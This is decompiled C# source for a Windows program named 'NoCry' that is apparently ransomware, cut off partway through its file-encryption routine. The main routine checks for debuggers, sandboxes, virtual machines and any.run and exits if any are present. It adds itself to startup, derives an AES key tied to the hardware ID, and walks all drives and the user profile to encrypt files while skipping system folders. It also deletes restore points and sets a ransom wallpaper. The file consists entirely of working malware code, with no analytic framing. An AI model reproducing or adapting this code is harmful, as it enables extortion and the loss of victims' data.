using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using NoCry.My;
using NoCry.My.Resources;

namespace NoCry;

[StandardModule]
internal sealed class Module1
{
	private enum CryptoAction
	{
		ActionEncrypt = 1
	}

	private static FileStream fsInput;

	private static FileStream fsOutput;

	private static byte[] bytKey;

	private static byte[] bytIV;

	private static string textbox;

	private const int SETDESKWALLPAPER = 20;

	private const int UPDATEINIFILE = 1;

	public static object protect;

	public static List<string> list = new List<string>();

	public static object MT = null;

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SystemParametersInfoA", ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfo(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void main()
	{
		//IL_0efd: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num = default(int);
		bool createdNew = default(bool);
		int num2 = default(int);
		int num3 = default(int);
		IEnumerator enumerator = default(IEnumerator);
		string text = default(string);
		string text2 = default(string);
		int num5 = default(int);
		StringBuilder stringBuilder = default(StringBuilder);
		Random random = default(Random);
		int maxrandom = default(int);
		int num6 = default(int);
		string input = default(string);
		int index = default(int);
		char value = default(char);
		string[] logicalDrives = default(string[]);
		string text3 = default(string);
		IEnumerator enumerator2 = default(IEnumerator);
		string text4 = default(string);
		string text5 = default(string);
		string[] directories = default(string[]);
		int num7 = default(int);
		string ruta = default(string);
		List<string>.Enumerator enumerator3 = default(List<string>.Enumerator);
		string current = default(string);
		string[] logicalDrives2 = default(string[]);
		int num8 = default(int);
		string text6 = default(string);
		IEnumerator enumerator4 = default(IEnumerator);
		string text7 = default(string);
		string[] directories2 = default(string[]);
		int num9 = default(int);
		string ruta2 = default(string);
		string lpvParam = default(string);
		IEnumerator enumerator5 = default(IEnumerator);
		string text8 = default(string);
		DriveInfo driveInfo = default(DriveInfo);
		string[] directories3 = default(string[]);
		int num10 = default(int);
		string text9 = default(string);
		IEnumerator enumerator6 = default(IEnumerator);
		string text10 = default(string);
		IEnumerator enumerator7 = default(IEnumerator);
		IEnumerator enumerator8 = default(IEnumerator);
		string text11 = default(string);
		IEnumerator enumerator9 = default(IEnumerator);
		string text12 = default(string);
		int num11 = default(int);
		DriveInfo driveInfo2 = default(DriveInfo);
		string[] directories4 = default(string[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0001_dispatch)
					{
					default:
						num = 1;
						createdNew = false;
						goto IL_0006;
					case 4860:
						{
							num2 = num;
							switch ((num3 <= -2) ? 1 : num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0006;
							case 3:
								goto IL_001a;
							case 4:
							case 5:
								goto IL_002e;
							case 6:
								goto IL_0049;
							case 7:
							case 8:
							case 9:
								goto IL_0060;
							case 10:
								goto IL_007c;
							case 11:
							case 12:
							case 13:
								goto IL_0094;
							case 14:
								goto IL_00b0;
							case 15:
							case 16:
							case 17:
								goto IL_00c8;
							case 18:
								goto IL_00e4;
							case 19:
							case 20:
							case 21:
								goto IL_00fc;
							case 22:
								goto IL_0118;
							case 23:
							case 24:
							case 25:
								goto IL_0130;
							case 26:
								goto IL_014c;
							case 27:
							case 28:
								goto IL_015c;
							case 29:
								goto IL_016e;
							case 31:
								goto IL_01a5;
							case 32:
								goto IL_01d4;
							case 33:
								goto IL_01de;
							case 34:
								goto IL_01e8;
							case 35:
								goto IL_01f7;
							case 36:
								goto IL_020e;
							case 37:
								goto IL_021f;
							case 38:
								goto IL_022c;
							case 39:
								goto IL_023b;
							case 40:
								goto IL_0247;
							case 41:
								goto IL_027a;
							case 30:
							case 42:
							case 43:
							case 44:
								goto IL_02d6;
							case 46:
								goto IL_030d;
							case 47:
								goto IL_0316;
							case 48:
								goto IL_0355;
							case 49:
								goto IL_0394;
							case 50:
								goto IL_03ad;
							case 51:
								goto IL_03b9;
							case 53:
								goto IL_03e3;
							case 54:
								goto IL_03fe;
							case 56:
								goto IL_041a;
							case 58:
								goto IL_0436;
							case 60:
								goto IL_0452;
							case 62:
								goto IL_046e;
							case 64:
								goto IL_048a;
							case 66:
								goto IL_04a6;
							case 68:
								goto IL_04c2;
							case 70:
								goto IL_04de;
							case 72:
								goto IL_04fa;
							case 74:
								goto IL_0516;
							case 76:
								goto IL_0532;
							case 77:
								goto IL_055d;
							case 79:
								goto IL_0576;
							case 81:
								goto IL_058f;
							case 83:
								goto IL_05a8;
							case 78:
							case 80:
							case 82:
							case 84:
							case 85:
							case 86:
							case 87:
								goto IL_05bb;
							case 88:
								goto IL_05cb;
							case 55:
							case 57:
							case 59:
							case 61:
							case 63:
							case 65:
							case 67:
							case 69:
							case 71:
							case 73:
							case 75:
							case 89:
							case 90:
							case 91:
							case 92:
							case 93:
							case 94:
							case 95:
							case 96:
							case 97:
							case 98:
							case 99:
							case 100:
								goto IL_05ef;
							case 101:
								goto IL_0609;
							case 102:
								goto IL_0639;
							case 104:
								goto IL_0652;
							case 106:
								goto IL_066b;
							case 108:
								goto IL_0684;
							case 103:
							case 105:
							case 107:
							case 109:
							case 110:
							case 111:
							case 112:
								goto IL_0697;
							case 113:
								goto IL_06a7;
							case 52:
							case 114:
							case 115:
								goto IL_06c1;
							case 116:
								goto IL_06db;
							case 117:
								goto IL_070e;
							case 119:
								goto IL_0727;
							case 121:
								goto IL_0740;
							case 123:
								goto IL_0759;
							case 118:
							case 120:
							case 122:
							case 124:
							case 125:
							case 126:
							case 127:
								goto IL_076c;
							case 128:
								goto IL_077c;
							case 129:
								goto IL_0798;
							case 130:
								goto IL_07be;
							case 131:
								goto IL_07ec;
							case 133:
								goto IL_0808;
							case 135:
								goto IL_0824;
							case 137:
								goto IL_0840;
							case 132:
							case 134:
							case 136:
							case 138:
							case 139:
							case 140:
							case 141:
								goto IL_0856;
							case 142:
								goto IL_086c;
							case 143:
								goto IL_0888;
							case 144:
								goto IL_08a5;
							case 145:
								goto IL_08c2;
							case 146:
								goto IL_08d5;
							case 147:
							case 148:
								goto IL_08fc;
							case 149:
								goto IL_090f;
							case 150:
								goto IL_0923;
							case 45:
							case 151:
							case 152:
								goto IL_093f;
							case 153:
								goto IL_0948;
							case 154:
								goto IL_0964;
							case 155:
								goto IL_0973;
							case 157:
								goto IL_09a0;
							case 158:
								goto IL_09be;
							case 160:
								goto IL_09dd;
							case 162:
								goto IL_09fc;
							case 164:
								goto IL_0a1b;
							case 166:
								goto IL_0a3a;
							case 168:
								goto IL_0a59;
							case 170:
								goto IL_0a78;
							case 172:
								goto IL_0a97;
							case 174:
								goto IL_0ab6;
							case 176:
								goto IL_0ad5;
							case 178:
								goto IL_0af4;
							case 180:
								goto IL_0b13;
							case 181:
								goto IL_0b3c;
							case 183:
								goto IL_0b58;
							case 185:
								goto IL_0b74;
							case 182:
							case 184:
							case 186:
							case 187:
							case 188:
								goto IL_0b89;
							case 189:
								goto IL_0b9c;
							case 159:
							case 161:
							case 163:
							case 165:
							case 167:
							case 169:
							case 171:
							case 173:
							case 175:
							case 177:
							case 179:
							case 190:
							case 191:
							case 192:
							case 193:
							case 194:
							case 195:
							case 196:
							case 197:
							case 198:
							case 199:
							case 200:
							case 201:
								goto IL_0bc3;
							case 202:
								goto IL_0be0;
							case 203:
								goto IL_0c0e;
							case 205:
								goto IL_0c2a;
							case 207:
								goto IL_0c46;
							case 204:
							case 206:
							case 208:
							case 209:
							case 210:
								goto IL_0c5b;
							case 211:
								goto IL_0c6e;
							case 156:
							case 212:
							case 213:
								goto IL_0c8b;
							case 214:
								goto IL_0ca8;
							case 215:
								goto IL_0cd9;
							case 217:
								goto IL_0cf5;
							case 219:
								goto IL_0d11;
							case 216:
							case 218:
							case 220:
							case 221:
							case 222:
								goto IL_0d26;
							case 223:
								goto IL_0d39;
							case 224:
								goto IL_0d55;
							case 225:
								goto IL_0d7b;
							case 226:
								goto IL_0da4;
							case 228:
								goto IL_0dc0;
							case 230:
								goto IL_0ddc;
							case 227:
							case 229:
							case 231:
							case 232:
							case 233:
								goto IL_0df1;
							case 234:
								goto IL_0e04;
							case 235:
								goto IL_0e20;
							case 236:
								goto IL_0e3d;
							case 237:
								goto IL_0e59;
							case 238:
							case 239:
								goto IL_0e67;
							case 240:
								goto IL_0e86;
							case 241:
							case 242:
								goto IL_0e94;
							case 243:
								goto IL_0eab;
							case 245:
								goto IL_0ec2;
							case 244:
							case 246:
							case 247:
								goto IL_0edb;
							case 248:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 249:
								goto end_IL_0001_3;
							}
							goto default;
						}
						IL_06a7:
						num = 113;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
						goto IL_06c1;
						IL_058f:
						num = 81;
						if (!text.EndsWith(St.exs))
						{
							goto IL_05a8;
						}
						goto IL_05bb;
						IL_069a:
						if (enumerator.MoveNext())
						{
							text2 = Conversions.ToString(enumerator.Current);
							goto IL_0639;
						}
						goto IL_06a7;
						IL_06c1:
						num = 115;
						num5++;
						goto IL_06ca;
						IL_0006:
						num = 2;
						MT = new Mutex(initiallyOwned: true, St.mute, out createdNew);
						goto IL_001a;
						IL_001a:
						num = 3;
						if (!createdNew)
						{
							ProjectData.EndApp();
						}
						goto IL_002e;
						IL_0576:
						num = 79;
						if (!list.Contains(text))
						{
							goto IL_058f;
						}
						goto IL_05bb;
						IL_002e:
						num = 5;
						if (Operators.CompareString(St.Emulator, "True", false) == 0)
						{
							goto IL_0049;
						}
						goto IL_0060;
						IL_0049:
						num = 6;
						if (Anti.Emulator())
						{
							ProjectData.EndApp();
						}
						goto IL_0060;
						IL_0639:
						num = 102;
						if (Operators.CompareString(text2, (string)null, false) != 0)
						{
							goto IL_0652;
						}
						goto IL_0697;
						IL_0060:
						num = 9;
						if (Operators.CompareString(St.DetectDebugger, "True", false) == 0)
						{
							goto IL_007c;
						}
						goto IL_0094;
						IL_007c:
						num = 10;
						if (Anti.DetectDebugger())
						{
							ProjectData.EndApp();
						}
						goto IL_0094;
						IL_0652:
						num = 104;
						if (!list.Contains(text2))
						{
							goto IL_066b;
						}
						goto IL_0697;
						IL_0094:
						num = 13;
						if (Operators.CompareString(St.DetectSandboxie, "True", false) == 0)
						{
							goto IL_00b0;
						}
						goto IL_00c8;
						IL_00b0:
						num = 14;
						if (Anti.DetectSandboxie())
						{
							ProjectData.EndApp();
						}
						goto IL_00c8;
						IL_066b:
						num = 106;
						if (!text2.EndsWith(St.exs))
						{
							goto IL_0684;
						}
						goto IL_0697;
						IL_00c8:
						num = 17;
						if (Operators.CompareString(St.DetectVirtualMachine, "True", false) == 0)
						{
							goto IL_00e4;
						}
						goto IL_00fc;
						IL_00e4:
						num = 18;
						if (Anti.DetectVirtualMachine())
						{
							ProjectData.EndApp();
						}
						goto IL_00fc;
						IL_0684:
						num = 108;
						list.Add(text2);
						goto IL_0697;
						IL_00fc:
						num = 21;
						if (Operators.CompareString(St.anyrun, "True", false) == 0)
						{
							goto IL_0118;
						}
						goto IL_0130;
						IL_0118:
						num = 22;
						if (Anti.anyrun())
						{
							ProjectData.EndApp();
						}
						goto IL_0130;
						IL_0697:
						num = 112;
						goto IL_069a;
						IL_0130:
						num = 25;
						if (Operators.CompareString(St.startup, "True", false) == 0)
						{
							goto IL_014c;
						}
						goto IL_015c;
						IL_014c:
						num = 26;
						startup(Application.get_ExecutablePath());
						goto IL_015c;
						IL_015c:
						num = 28;
						St.hash = Conversions.ToString(Bot());
						goto IL_016e;
						IL_016e:
						num = 29;
						if (Operators.CompareString(Interaction.GetSetting("F", "0", St.Setting, ""), "Done", false) != 0)
						{
							goto IL_01a5;
						}
						goto IL_02d6;
						IL_01a5:
						num = 31;
						if (Operators.CompareString(Interaction.GetSetting("F", "0", St.Setting, ""), (string)null, false) == 0)
						{
							goto IL_01d4;
						}
						goto IL_02d6;
						IL_01d4:
						num = 32;
						stringBuilder = new StringBuilder();
						goto IL_01de;
						IL_01de:
						num = 33;
						random = new Random();
						goto IL_01e8;
						IL_01e8:
						num = 34;
						maxrandom = St.maxrandom;
						num6 = 1;
						goto IL_0235;
						IL_0235:
						if (num6 <= maxrandom)
						{
							goto IL_01f7;
						}
						goto IL_023b;
						IL_023b:
						num = 39;
						input = stringBuilder.ToString();
						goto IL_0247;
						IL_0247:
						num = 40;
						Interaction.SaveSetting("F", "0", St.Setting, Conversions.ToString(check.AES_Encrypt(input, HWID() + HWID())));
						goto IL_027a;
						IL_027a:
						num = 41;
						Interaction.SaveSetting("G", "0", St.Setting, Conversions.ToString(check.AES_Encrypt(St.Setting, Conversions.ToString(check.AES_Decrypttt(Interaction.GetSetting("F", "0", St.Setting, ""), HWID() + HWID())))));
						goto IL_02d6;
						IL_01f7:
						num = 35;
						index = random.Next(0, St.validchars.Length);
						goto IL_020e;
						IL_020e:
						num = 36;
						value = St.validchars[index];
						goto IL_021f;
						IL_021f:
						num = 37;
						stringBuilder.Append(value);
						goto IL_022c;
						IL_022c:
						num = 38;
						num6++;
						goto IL_0235;
						IL_02d6:
						num = 44;
						if (Operators.CompareString(Interaction.GetSetting("C", "0", St.Setting, ""), "Done", false) != 0)
						{
							goto IL_030d;
						}
						goto IL_093f;
						IL_030d:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0316;
						IL_0316:
						num = 47;
						bytKey = CreateKey(Conversions.ToString(check.AES_Decrypttt(Interaction.GetSetting("F", "0", St.Setting, ""), HWID() + HWID())));
						goto IL_0355;
						IL_0355:
						num = 48;
						bytIV = CreateIV(Conversions.ToString(check.AES_Decrypttt(Interaction.GetSetting("F", "0", St.Setting, ""), HWID() + HWID())));
						goto IL_0394;
						IL_0394:
						num = 49;
						logicalDrives = Environment.GetLogicalDrives();
						num5 = 0;
						goto IL_06ca;
						IL_06ca:
						if (num5 < logicalDrives.Length)
						{
							text3 = logicalDrives[num5];
							goto IL_03ad;
						}
						goto IL_06db;
						IL_06db:
						num = 116;
						enumerator2 = ((IEnumerable)inonly(Interaction.Environ("USERPROFILE"), ".*")).GetEnumerator();
						goto IL_076f;
						IL_076f:
						if (enumerator2.MoveNext())
						{
							text4 = Conversions.ToString(enumerator2.Current);
							goto IL_070e;
						}
						goto IL_077c;
						IL_077c:
						num = 128;
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
						goto IL_0798;
						IL_041a:
						num = 56;
						if (!text5.EndsWith("indows"))
						{
							goto IL_0436;
						}
						goto IL_05ef;
						IL_0798:
						num = 129;
						directories = Directory.GetDirectories(Interaction.Environ("USERPROFILE"));
						num7 = 0;
						goto IL_0894;
						IL_0894:
						if (num7 < directories.Length)
						{
							ruta = directories[num7];
							goto IL_07be;
						}
						goto IL_08a5;
						IL_08a5:
						num = 144;
						enumerator3 = list.GetEnumerator();
						goto IL_0902;
						IL_0902:
						if (enumerator3.MoveNext())
						{
							current = enumerator3.Current;
							goto IL_08c2;
						}
						goto IL_090f;
						IL_090f:
						num = 149;
						((IDisposable)enumerator3).Dispose();
						goto IL_0923;
						IL_0923:
						num = 150;
						MyProject.Forms.Form1.BackgroundWorker1.RunWorkerAsync();
						goto IL_093f;
						IL_093f:
						ProjectData.ClearProjectError();
						num3 = -3;
						goto IL_0948;
						IL_0948:
						num = 153;
						logicalDrives2 = Environment.GetLogicalDrives();
						num8 = 0;
						goto IL_0c97;
						IL_0c97:
						if (num8 < logicalDrives2.Length)
						{
							text6 = logicalDrives2[num8];
							goto IL_0964;
						}
						goto IL_0ca8;
						IL_0ca8:
						num = 214;
						enumerator4 = ((IEnumerable)enc2(Interaction.Environ("USERPROFILE"))).GetEnumerator();
						goto IL_0d2c;
						IL_0d2c:
						if (enumerator4.MoveNext())
						{
							text7 = Conversions.ToString(enumerator4.Current);
							goto IL_0cd9;
						}
						goto IL_0d39;
						IL_0d39:
						num = 223;
						if (enumerator4 is IDisposable)
						{
							(enumerator4 as IDisposable).Dispose();
						}
						goto IL_0d55;
						IL_04a6:
						num = 66;
						if (!text5.EndsWith("rogram Files (x86)"))
						{
							goto IL_04c2;
						}
						goto IL_05ef;
						IL_0d55:
						num = 224;
						directories2 = Directory.GetDirectories(Interaction.Environ("USERPROFILE"));
						num9 = 0;
						goto IL_0e2c;
						IL_0e2c:
						if (num9 < directories2.Length)
						{
							ruta2 = directories2[num9];
							goto IL_0d7b;
						}
						goto IL_0e3d;
						IL_0e3d:
						num = 236;
						if (Operators.ConditionalCompareObjectEqual(St.Del, (object)"OK", false))
						{
							goto IL_0e59;
						}
						goto IL_0e67;
						IL_0e59:
						num = 237;
						del.del();
						goto IL_0e67;
						IL_0e67:
						num = 239;
						if (Operators.CompareString(St.DeleteRestorePoints, "True", false) == 0)
						{
							goto IL_0e86;
						}
						goto IL_0e94;
						IL_0e86:
						num = 240;
						DeleteRestorePoints();
						goto IL_0e94;
						IL_0e94:
						num = 242;
						lpvParam = Path.GetTempPath() + "Cry.img";
						goto IL_0eab;
						IL_0eab:
						num = 243;
						if (!File.Exists(lpvParam))
						{
							goto IL_0ec2;
						}
						goto IL_0edb;
						IL_0ec2:
						num = 245;
						((Image)Resources.background).Save(lpvParam, ImageFormat.get_Bmp());
						goto IL_0edb;
						IL_0edb:
						num = 247;
						SystemParametersInfo(20, 0, ref lpvParam, 1);
						break;
						IL_04c2:
						num = 68;
						if (!text5.EndsWith("rogram Files"))
						{
							goto IL_04de;
						}
						goto IL_05ef;
						IL_0d7b:
						num = 225;
						enumerator5 = ((IEnumerable)enc1(ruta2)).GetEnumerator();
						goto IL_0df7;
						IL_0df7:
						if (enumerator5.MoveNext())
						{
							text8 = Conversions.ToString(enumerator5.Current);
							goto IL_0da4;
						}
						goto IL_0e04;
						IL_0e04:
						num = 234;
						if (enumerator5 is IDisposable)
						{
							(enumerator5 as IDisposable).Dispose();
						}
						goto IL_0e20;
						IL_04fa:
						num = 72;
						if (!text5.EndsWith("efi"))
						{
							goto IL_0516;
						}
						goto IL_05ef;
						IL_0e20:
						num = 235;
						num9++;
						goto IL_0e2c;
						IL_04de:
						num = 70;
						if (!text5.EndsWith("boot"))
						{
							goto IL_04fa;
						}
						goto IL_05ef;
						IL_0da4:
						num = 226;
						if (Operators.CompareString(text8, (string)null, false) != 0)
						{
							goto IL_0dc0;
						}
						goto IL_0df1;
						IL_0dc0:
						num = 228;
						if (!Form4.listenc.Contains(text8))
						{
							goto IL_0ddc;
						}
						goto IL_0df1;
						IL_0ddc:
						num = 230;
						Form4.listenc.Add(text8);
						goto IL_0df1;
						IL_0df1:
						num = 233;
						goto IL_0df7;
						IL_048a:
						num = 64;
						if (!text5.EndsWith("very"))
						{
							goto IL_04a6;
						}
						goto IL_05ef;
						IL_0cd9:
						num = 215;
						if (Operators.CompareString(text7, (string)null, false) != 0)
						{
							goto IL_0cf5;
						}
						goto IL_0d26;
						IL_0cf5:
						num = 217;
						if (!Form4.listenc.Contains(text7))
						{
							goto IL_0d11;
						}
						goto IL_0d26;
						IL_0d11:
						num = 219;
						Form4.listenc.Add(text7);
						goto IL_0d26;
						IL_0d26:
						num = 222;
						goto IL_0d2c;
						IL_046e:
						num = 62;
						if (!text5.EndsWith("cache"))
						{
							goto IL_048a;
						}
						goto IL_05ef;
						IL_0964:
						num = 154;
						driveInfo = new DriveInfo(text6);
						goto IL_0973;
						IL_0973:
						num = 155;
						if (Operators.CompareString(driveInfo.Name, Path.GetPathRoot(Environment.SystemDirectory), false) != 0)
						{
							goto IL_09a0;
						}
						goto IL_0c8b;
						IL_09a0:
						num = 157;
						directories3 = Directory.GetDirectories(text6);
						num10 = 0;
						goto IL_0bcf;
						IL_0bcf:
						if (num10 < directories3.Length)
						{
							text9 = directories3[num10];
							goto IL_09be;
						}
						goto IL_0be0;
						IL_0be0:
						num = 202;
						enumerator6 = ((IEnumerable)enc2(driveInfo.Name)).GetEnumerator();
						goto IL_0c61;
						IL_0c61:
						if (enumerator6.MoveNext())
						{
							text10 = Conversions.ToString(enumerator6.Current);
							goto IL_0c0e;
						}
						goto IL_0c6e;
						IL_0c6e:
						num = 211;
						if (enumerator6 is IDisposable)
						{
							(enumerator6 as IDisposable).Dispose();
						}
						goto IL_0c8b;
						IL_05be:
						if (enumerator7.MoveNext())
						{
							text = Conversions.ToString(enumerator7.Current);
							goto IL_055d;
						}
						goto IL_05cb;
						IL_0c8b:
						num = 213;
						num8++;
						goto IL_0c97;
						IL_0532:
						num = 76;
						enumerator7 = ((IEnumerable)outonly(text5, ".*")).GetEnumerator();
						goto IL_05be;
						IL_0c0e:
						num = 203;
						if (Operators.CompareString(text10, (string)null, false) != 0)
						{
							goto IL_0c2a;
						}
						goto IL_0c5b;
						IL_0c2a:
						num = 205;
						if (!Form4.listenc.Contains(text10))
						{
							goto IL_0c46;
						}
						goto IL_0c5b;
						IL_0c46:
						num = 207;
						Form4.listenc.Add(text10);
						goto IL_0c5b;
						IL_0c5b:
						num = 210;
						goto IL_0c61;
						IL_0516:
						num = 74;
						if (!text5.EndsWith(".old"))
						{
							goto IL_0532;
						}
						goto IL_05ef;
						IL_09be:
						num = 158;
						if (!text9.EndsWith("Bin"))
						{
							goto IL_09dd;
						}
						goto IL_0bc3;
						IL_09dd:
						num = 160;
						if (!text9.EndsWith("indows"))
						{
							goto IL_09fc;
						}
						goto IL_0bc3;
						IL_09fc:
						num = 162;
						if (!text9.EndsWith("tings"))
						{
							goto IL_0a1b;
						}
						goto IL_0bc3;
						IL_0a1b:
						num = 164;
						if (!text9.EndsWith("System Volume Information"))
						{
							goto IL_0a3a;
						}
						goto IL_0bc3;
						IL_0a3a:
						num = 166;
						if (!text9.EndsWith("cache"))
						{
							goto IL_0a59;
						}
						goto IL_0bc3;
						IL_0a59:
						num = 168;
						if (!text9.EndsWith("very"))
						{
							goto IL_0a78;
						}
						goto IL_0bc3;
						IL_0a78:
						num = 170;
						if (!text9.EndsWith("rogram Files (x86)"))
						{
							goto IL_0a97;
						}
						goto IL_0bc3;
						IL_0a97:
						num = 172;
						if (!text9.EndsWith("rogram Files"))
						{
							goto IL_0ab6;
						}
						goto IL_0bc3;
						IL_0ab6:
						num = 174;
						if (!text9.EndsWith("boot"))
						{
							goto IL_0ad5;
						}
						goto IL_0bc3;
						IL_0ad5:
						num = 176;
						if (!text9.EndsWith("efi"))
						{
							goto IL_0af4;
						}
						goto IL_0bc3;
						IL_0af4:
						num = 178;
						if (!text9.EndsWith(".old"))
						{
							goto IL_0b13;
						}
						goto IL_0bc3;
						IL_0b13:
						num = 180;
						enumerator8 = ((IEnumerable)enc1(text9)).GetEnumerator();
						goto IL_0b8f;
						IL_0b8f:
						if (enumerator8.MoveNext())
						{
							text11 = Conversions.ToString(enumerator8.Current);
							goto IL_0b3c;
						}
						goto IL_0b9c;
						IL_0b9c:
						num = 189;
						if (enumerator8 is IDisposable)
						{
							(enumerator8 as IDisposable).Dispose();
						}
						goto IL_0bc3;
						IL_05bb:
						num = 87;
						goto IL_05be;
						IL_0bc3:
						num = 201;
						num10++;
						goto IL_0bcf;
						IL_05cb:
						num = 88;
						if (enumerator7 is IDisposable)
						{
							(enumerator7 as IDisposable).Dispose();
						}
						goto IL_05ef;
						IL_0b3c:
						num = 181;
						if (Operators.CompareString(text11, (string)null, false) != 0)
						{
							goto IL_0b58;
						}
						goto IL_0b89;
						IL_0b58:
						num = 183;
						if (!Form4.listenc.Contains(text11))
						{
							goto IL_0b74;
						}
						goto IL_0b89;
						IL_0b74:
						num = 185;
						Form4.listenc.Add(text11);
						goto IL_0b89;
						IL_0b89:
						num = 188;
						goto IL_0b8f;
						IL_0452:
						num = 60;
						if (!text5.EndsWith("System Volume Information"))
						{
							goto IL_046e;
						}
						goto IL_05ef;
						IL_08c2:
						num = 145;
						if (File.Exists(current))
						{
							goto IL_08d5;
						}
						goto IL_08fc;
						IL_08d5:
						num = 146;
						EncryptOrDecryptFile(current, current + St.exs, bytKey, bytIV, CryptoAction.ActionEncrypt);
						goto IL_08fc;
						IL_08fc:
						num = 148;
						goto IL_0902;
						IL_0436:
						num = 58;
						if (!text5.EndsWith("tings"))
						{
							goto IL_0452;
						}
						goto IL_05ef;
						IL_07be:
						num = 130;
						enumerator9 = ((IEnumerable)outonly(ruta, ".*")).GetEnumerator();
						goto IL_085c;
						IL_085c:
						if (enumerator9.MoveNext())
						{
							text12 = Conversions.ToString(enumerator9.Current);
							goto IL_07ec;
						}
						goto IL_086c;
						IL_086c:
						num = 142;
						if (enumerator9 is IDisposable)
						{
							(enumerator9 as IDisposable).Dispose();
						}
						goto IL_0888;
						IL_05a8:
						num = 83;
						list.Add(text);
						goto IL_05bb;
						IL_0888:
						num = 143;
						num7++;
						goto IL_0894;
						IL_05ef:
						num = 100;
						num11++;
						goto IL_05f8;
						IL_07ec:
						num = 131;
						if (Operators.CompareString(text12, (string)null, false) != 0)
						{
							goto IL_0808;
						}
						goto IL_0856;
						IL_0808:
						num = 133;
						if (!list.Contains(text12))
						{
							goto IL_0824;
						}
						goto IL_0856;
						IL_0824:
						num = 135;
						if (!text12.EndsWith(St.exs))
						{
							goto IL_0840;
						}
						goto IL_0856;
						IL_0840:
						num = 137;
						list.Add(text12);
						goto IL_0856;
						IL_0856:
						num = 141;
						goto IL_085c;
						IL_03fe:
						num = 54;
						if (!text5.EndsWith("Bin"))
						{
							goto IL_041a;
						}
						goto IL_05ef;
						IL_070e:
						num = 117;
						if (Operators.CompareString(text4, (string)null, false) != 0)
						{
							goto IL_0727;
						}
						goto IL_076c;
						IL_0727:
						num = 119;
						if (!list.Contains(text4))
						{
							goto IL_0740;
						}
						goto IL_076c;
						IL_0740:
						num = 121;
						if (!text4.EndsWith(St.exs))
						{
							goto IL_0759;
						}
						goto IL_076c;
						IL_0759:
						num = 123;
						list.Add(text4);
						goto IL_076c;
						IL_076c:
						num = 127;
						goto IL_076f;
						IL_055d:
						num = 77;
						if (Operators.CompareString(text, (string)null, false) != 0)
						{
							goto IL_0576;
						}
						goto IL_05bb;
						IL_03ad:
						num = 50;
						driveInfo2 = new DriveInfo(text3);
						goto IL_03b9;
						IL_03b9:
						num = 51;
						if (Operators.CompareString(driveInfo2.Name, Path.GetPathRoot(Environment.SystemDirectory), false) != 0)
						{
							goto IL_03e3;
						}
						goto IL_06c1;
						IL_03e3:
						num = 53;
						directories4 = Directory.GetDirectories(text3);
						num11 = 0;
						goto IL_05f8;
						IL_05f8:
						if (num11 < directories4.Length)
						{
							text5 = directories4[num11];
							goto IL_03fe;
						}
						goto IL_0609;
						IL_0609:
						num = 101;
						enumerator = ((IEnumerable)inonly(driveInfo2.Name, ".*")).GetEnumerator();
						goto IL_069a;
						end_IL_0001_2:
						break;
					}
					num = 248;
					((Form)MyProject.Forms.Form1).ShowDialog();
					break;
				}
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 4860;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static object outonly(string ruta, string mExtesiones)
	{
		return from ifilesinfo in Directory.GetFiles(ruta, "*" + mExtesiones, SearchOption.AllDirectories)
			select (ifilesinfo);
	}

	public static object inonly(string ruta, string mExtesiones)
	{
		return from ifilesinfo in Directory.GetFiles(ruta, "*" + mExtesiones)
			select (ifilesinfo);
	}

	public static object enc1(string ruta)
	{
		return from ifilesinfo in Directory.GetFiles(ruta, "*" + St.exs, SearchOption.AllDirectories)
			select (ifilesinfo);
	}

	public static object enc2(string ruta)
	{
		return from ifilesinfo in Directory.GetFiles(ruta, "*" + St.exs)
			select (ifilesinfo);
	}

	private static void EncryptOrDecryptFile(string strInputFile, string strOutputFile, byte[] bytKey, byte[] bytIV, CryptoAction Direction)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		byte[] buffer = default(byte[]);
		CryptoStream cryptoStream = default(CryptoStream);
		FileInfo fileInfo = default(FileInfo);
		long num6 = default(long);
		long length = default(long);
		RijndaelManaged rijndaelManaged = default(RijndaelManaged);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000b;
				case 410:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000b;
						case 3:
							goto IL_001a;
						case 4:
							goto IL_0029;
						case 5:
							goto IL_0038;
						case 6:
							goto IL_0045;
						case 7:
							goto IL_004b;
						case 8:
							goto IL_0059;
						case 9:
							goto IL_0063;
						case 11:
							goto IL_0072;
						case 15:
							goto IL_0090;
						case 16:
							goto IL_00a6;
						case 17:
							goto IL_00b5;
						case 10:
						case 12:
						case 13:
						case 14:
						case 18:
							goto IL_00c1;
						case 19:
							goto IL_00d0;
						case 20:
